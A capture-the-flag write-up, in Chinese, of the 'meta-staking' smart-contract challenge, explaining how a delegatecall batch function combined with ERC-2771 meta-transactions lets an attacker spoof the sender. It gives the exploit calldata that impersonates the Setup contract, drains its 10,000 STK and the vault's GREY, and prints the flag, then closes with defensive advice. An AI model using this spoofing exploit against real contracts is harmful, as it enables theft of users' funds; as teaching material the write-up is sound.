# meta-staking

## 题目简述

质押合约同时支持 ERC-2771 风格的元交易和基于 `delegatecall` 的批量执行。可信 Relayer 会把已签名的 `transaction.from` 追加到外层 calldata；但批处理在内部换成攻击者提供的新 calldata 后，`_msgSender()` 仍因 `msg.sender == relayer` 而信任最后 20 字节，导致任意地址冒充。

## 解题过程

Relayer 校验用户签名后执行：

```solidity
bytes memory d = abi.encodePacked(transaction.data, transaction.from);
success := call(g, a, v, add(d, 0x20), mload(d), 0, 0)
```

直接调用业务函数时，末尾地址确实是已认证的 `from`。然而外层目标改为 `batchExecute(bytes[])` 后，它会对每个数组元素执行：

```solidity
address(this).delegatecall(data[i]);
```

`delegatecall` 保留外层的 `msg.sender`，所以内部调用仍被视为来自可信 Relayer；与此同时，内部 `msg.data` 已替换成完全由攻击者控制的 `data[i]`。因此可把 Setup 地址自行追加到一笔 `Staking.transfer` 调用后：

```solidity
bytes[] memory calls = new bytes[](1);
calls[0] = abi.encodePacked(
    abi.encodeCall(Staking.transfer, (address(this), 10_000e18)),
    address(setup)
);
```

外层元交易只需由攻击者自己的密钥正常签名，其 `data` 是 `batchExecute(calls)`。进入内部 `transfer` 时，`_msgSender()` 读取 `calls[0]` 最后 20 字节并错误返回 Setup 地址，于是把 Setup 持有的 10000 STK 全部转给攻击合约。

攻击合约随后正常调用：

```solidity
staking.unstake(10_000e18);
grey.transfer(attacker, 10_000e18);
```

质押凭证被销毁，Vault 中的全部 GREY 转出，得到：

```text
grey{erc2771_multicall_address_spoofing_bug}
```

## 方法总结

ERC-2771 与批处理各自并不必然有问题，危险来自调用上下文组合：可信 `msg.sender` 被 `delegatecall` 保留，但用于恢复真实发送者的 calldata 却被攻击者替换。批处理必须为每个内部调用正确传播并验证上下文，或使用已经修复这一交互的标准实现；不能只检查“调用者是否是可信转发器”。
